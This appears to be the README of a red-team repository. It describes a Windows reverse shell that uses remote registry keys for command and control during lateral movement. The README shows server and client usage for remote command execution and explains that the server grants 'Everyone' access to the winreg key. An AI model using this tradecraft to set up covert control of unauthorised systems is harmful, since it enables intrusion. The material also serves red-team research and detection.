# Everything Is A(n asynchronous) Reverse Shell

This repository is made to explore some uncommon ways for establishing command and control (c2) on Microsoft Windows systems. 

The reverse shells in this repository are asynchronous just like Cobalt Strikes shells. Asyncronous, meaning that the client and server will not communicate all the time like a standard netcat/meterpreter reverse shell. Instead, the client will check-in for any new commands from the server. If a command is found, it will execute it and post the output back to the server. The checkin-interval is a sleep timer just like Cobalt Strikes. 

At this moment, the repository only has a C2 using Windows Registry keys, but more will hopefully be added in the future. 

## C2 using Windows registry keys

### Short description: 
This reverse shell is based on Windows Registry keys. Windows allows for certain users to read, write and/or delete registry keys on remote systems using the WinReg Protocol (MS-RRP), which is build on top of the RPC protocol. (https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78) Using custom code, it is possible to create a client-server relationsship by having certain registry keys located on the server that the client can interact with.  

**Requirements:** 
The Remote Registry Service needs to be enabled on the server, and the user trying to connect/read/write to the remote registry needs to have the correct permissions.

**Limitations:** 
Since the traffic is based on RPC, should only be suitable for lateral movement on local networks. 

### Usage:
**Server (listener):**
``` 
RegC2Server.exe <Unique Registry key name to use>
RegC2Server.exe dc01
>help
sleep 10         Set the sleep time to 10
cmd whoami       Execute whoami
exit             Exit the application gracefully
```
**Client-side:**
```
RegC2Client.exe <host> <Registry name to use>
RegC2Client.exe dc01 ws01
```

### How it works:
When the server starts, the Remote Registry Service is enabled. Then, the registry key HKEY_LOCAL_MACHINE\Software\RegistryC2\<user-defined name> is created along with the following registry values: cmd, output & sleep. 
Permissions are then set for the user "Everyone" on the newly created registry key and, importantly, the registry key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurePipeServers\winreg. 

This ensures that the client can authenticate to the server and has access to the relevant registry values. On exiting the server, the permissions are removed again. 

### Screenshot:


Win32 apis 

Wireshark traffic

intro to shell, usage. 
